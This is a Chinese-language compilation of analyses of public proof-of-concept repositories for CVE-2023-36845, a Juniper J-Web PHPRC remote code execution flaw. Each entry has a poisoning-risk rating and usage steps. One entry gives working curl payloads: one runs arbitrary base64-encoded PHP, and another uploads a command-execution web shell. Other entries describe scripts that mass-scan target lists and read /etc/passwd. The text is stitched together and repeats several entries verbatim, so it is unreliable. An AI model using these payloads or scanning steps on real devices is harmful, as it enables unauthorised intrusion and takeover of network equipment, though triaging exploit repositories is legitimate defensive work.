根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

